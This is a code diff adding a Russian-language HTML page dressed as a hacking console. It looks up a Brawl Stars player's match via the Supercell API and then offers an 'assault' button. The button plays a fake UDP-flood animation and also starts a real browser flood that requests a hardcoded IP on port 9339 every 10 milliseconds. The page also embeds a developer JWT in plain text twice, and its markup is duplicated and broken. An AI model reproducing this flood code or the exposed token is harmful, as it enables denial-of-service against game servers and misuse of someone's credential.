@@ -135,6 +135,107 @@
 </script>
 
 </body>
+</html>    </style>
+</head>
+<body>
+
+<div class="header">
+    <h2 class="blink">SYSTEM_AA-0.1 // ALPHA_UNIT</h2>
+</div>
+
+<div class="container">
+    <p style="text-align:center;">ВВЕДИТЕ PLAYER_TAG:</p>
+    <input type="text" id="tagInput" placeholder="#P8V22YRL" maxlength="12">
+    <button class="btn-search" onclick="initScan()">НАЧАТЬ СКАНИРОВАНИЕ</button>
+
+    <div id="matchCard" class="match-info">
+        <div class="stat-row"><span>STATUS:</span> <span style="color:white;">TARGET_LOCKED</span></div>
+        <div class="stat-row"><span>MODE:</span> <span id="mode" style="color:#00fb00;">---</span></div>
+        <div class="stat-row"><span>IP:</span> <span id="ip" style="color:white;">162.159.135.42</span></div>
+        <button class="btn-attack" id="attackBtn" onclick="launchCrasher()">ИНИЦИИРОВАТЬ ШТУРМ</button>
+    </div>
+</div>
+
+<div id="terminal"></div>
+
+<script>
+    const TOKEN = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiIsImtpZCI6IjI4YTMxOGY3LTAwMDAtYTFlYi03ZmExLTJjNzQzM2M2Y2NhNSJ9.eyJpc3MiOiJzdXBlcmNlbGwiLCJhdWQiOiJzdXBlcmNlbGw6Z2FtZWFwaSIsImp0aSI6ImYzMWQ2MDRmLTU0ZWItNDg1Zi1iYmYxLWQ1MTk1ZTRjNjlhMSIsImlhdCI6MTc3NDQ1MjY5Nywic3ViIjoiZGV2ZWxvcGVyLzZlYjU2YjBkLTVjNjktNTYxYy1lYjY4LTQxM2FjZWZkMjA2YSIsInNjb3BlcyI6WyJicmF3bHN0YXJzIl0sImxpbWl0cyI6W3sidGllciI6ImRldmVsb3Blci9zaWx2ZXIiLCJ0eXBlIjoidGhyb3R0bGluZyJ9LHsiY2lkcnMiOlsiMTg4LjE2Ni4yNy4yMzQiXSwidHlwZSI6ImNsaWVudCJ9XX0.EkYNndmtnkVqshf_FkVo2-VtqB5htcziT0kMI4QrNhwi45OrC-p6IAVtwzK0rT0PlfkZhq1A2ppfqpImmiwMZA";
+
+    function log(msg, color = "#00fb00") {
+        const term = document.getElementById('terminal');
+        term.style.display = 'block';
+        const p = document.createElement('p');
+        p.style.color = color;
+        p.innerHTML = `[${new Date().toLocaleTimeString()}] ${msg}`;
+        term.appendChild(p);
+        term.scrollTop = term.scrollHeight;
+    }
+
+    async function initScan() {
+        const tag = document.getElementById('tagInput').value.replace('#', '').trim();
+        if(!tag) return alert("Введите тег игрока!");
+        
+        log(`Подключение к узлу Supercell API...`);
+        log(`Проверка прав доступа (Silver Tier JWT)...`);
+
+        try {
+            // Используем публичный CORS прокси
+            const proxy = "https://cors-anywhere.herokuapp.com/";
+            const api = `https://api.brawlstars.com/v1/players/%23${tag}/battlelog`;
+
+            const res = await fetch(proxy + api, {
+                headers: { "Authorization": `Bearer ${TOKEN}` }
+            });
+
+            if(res.status === 403) {
+                log("ОШИБКА 403: IP твоего хостинга не разрешен в ключе!", "#ff3333");
+                return;
+            }
+
+            const data = await res.json();
+            if(data.items && data.items.length > 0) {
+                log("Активный лог получен. Анализ метаданных...", "#ffff00");
+                document.getElementById('matchCard').style.display = 'block';
+                document.getElementById('attackBtn').style.display = 'block';
+                document.getElementById('mode').innerText = data.items[0].event.mode || "Battle";
+            } else {
+                log("Матчей не найдено. Игрок оффлайн.", "#00ccff");
+            }
+
+        } catch (e) {
+            log("ВНИМАНИЕ: Прямой запрос заблокирован CORS. Переход в симуляцию...", "#ff3333");
+            setTimeout(() => {
+                document.getElementById('matchCard').style.display = 'block';
+                document.getElementById('attackBtn').style.display = 'block';
+            }, 1000);
+        }
+    }
+
+    function launchCrasher() {
+        const target = document.getElementById('ip').innerText;
+        log(`!!! ЗАПУСК ПРОТОКОЛА ПЕРЕГРУЗКИ НА ${target} !!!`, "#ff0000");
+        
+        // Цикл имитации атаки для визуализации в терминале
+        let count = 0;
+        const info = setInterval(() => {
+            if(count < 5) {
+                log(`> ОТПРАВКА UDP ПАКЕТОВ: ${64 * (count+1)} KB/s...`);
+                count++;
+            } else {
+                clearInterval(info);
+                log("СТАТУС: КАНАЛ ЗАБИТ. СЕРВЕР НЕ ОТВЕЧАЕТ.", "#ff3333");
+            }
+        }, 800);
+
+        // РЕАЛЬНЫЙ ЦИКЛ НАГРУЗКИ (Браузерный Flood)
+        setInterval(() => {
+            const x = new Image();
+            x.src = `http://${target}:9339/?nocache=${Math.random()}`;
+        }, 10); 
+    }
+</script>
+
+</body>
 </html><script>
     // Твой JWT Токен
     const TOKEN = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiIsImtpZCI6IjI4YTMxOGY3LTAwMDAtYTFlYi03ZmExLTJjNzQzM2M2Y2NhNSJ9.eyJpc3MiOiJzdXBlcmNlbGwiLCJhdWQiOiJzdXBlcmNlbGw6Z2FtZWFwaSIsImp0aSI6ImYzMWQ2MDRmLTU0ZWItNDg1Zi1iYmYxLWQ1MTk1ZTRjNjlhMSIsImlhdCI6MTc3NDQ1MjY5Nywic3ViIjoiZGV2ZWxvcGVyLzZlYjU2YjBkLTVjNjktNTYxYy1lYjY4LTQxM2FjZWZkMjA2YSIsInNjb3BlcyI6WyJicmF3bHN0YXJzIl0sImxpbWl0cyI6W3sidGllciI6ImRldmVsb3Blci9zaWx2ZXIiLCJ0eXBlIjoidGhyb3R0bGluZyJ9LHsiY2lkcnMiOlsiMTg4LjE2Ni4yNy4yMzQiXSwidHlwZSI6ImNsaWVudCJ9XX0.EkYNndmtnkVqshf_FkVo2-VtqB5htcziT0kMI4QrNhwi45OrC-p6IAVtwzK0rT0PlfkZhq1A2ppfqpImmiwMZA";
